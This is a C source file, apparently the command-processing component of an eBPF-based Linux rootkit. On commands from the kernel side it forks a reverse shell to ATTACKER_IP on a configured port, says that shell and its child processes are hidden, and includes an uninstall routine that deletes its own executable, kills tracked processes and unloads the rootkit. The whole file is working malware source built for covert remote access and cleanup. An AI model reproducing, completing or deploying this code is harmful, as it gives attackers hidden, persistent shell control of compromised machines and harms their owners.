#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/command_processor.h"
#include "userspace/loader.h"
#include "userspace/reverse_shell.h"

/**
 * @brief Kill all tracked PIDs from eBPF map
 * except self process.
 * 
 * @param application_ctx 
 */
static void kill_all_tracked_pids(application_context_t *application_ctx) {
    pid_t pid;
    pid_t next_pid;
    int fd = bpf_map__fd(application_ctx->skel->maps.tracked_pids_map);

    int ret = bpf_map_get_next_key(fd, NULL, &next_pid);

    while (ret == 0) {
        pid = next_pid;

        if (pid != getpid())
            kill(pid, SIGTERM);

        ret = bpf_map_get_next_key(fd, &pid, &next_pid);
    }
}

/**
 * @brief Kill revese shell process.
 * 
 * @param application_ctx 
 */
static void remove_reverse_shell(application_context_t *application_ctx) {
    if (application_ctx->reverse_shell_pid > 0) {
        kill(application_ctx->reverse_shell_pid, SIGTERM);
        application_ctx->reverse_shell_pid = -1;
    }
}

static void uninstall(application_context_t *application_ctx) {
    /* Deleting executable */
    unlink(application_ctx->executable_name);
    kill_all_tracked_pids(application_ctx);
    loader_unload_rootkit(application_ctx->skel);
    exit(0);
}

/**
 * @brief Spawn a reverse shell.
 *
 * PID of the reverse shell will automatically be hidden
 * together with every child process of it.
 *
 * @param application_ctx
 * @return int
 */
static int spawn_reverse_shell(application_context_t *application_ctx) {
    pid_t pid = fork();
    if (pid < 0) {
        int err = errno;
        return -err;
    }

    if (pid == 0)
        reverse_shell_start(ATTACKER_IP, REVERSE_SHELL_PORT);

    application_ctx->reverse_shell_pid = pid;

    return 0;
}

int command_processor_handle_received_command(void *ctx, void *data, size_t data_sz) {
    (void)ctx;
    (void)data_sz;

    application_context_t *application_ctx = (application_context_t *)ctx;

    event_t *event = (event_t *)data;

    switch (event->command_opcode) {
    case COMMAND_REVERSE_SHELL_START:
        if (application_ctx->reverse_shell_pid == -1)
            spawn_reverse_shell(application_ctx);
        break;
    case COMMAND_REVERSE_SHELL_STOP:
        remove_reverse_shell(application_ctx);
        break;
    case COMMAND_UNINSTALL:
        uninstall(application_ctx);
        break;
    default:
        break;
    }

    return 0;
}
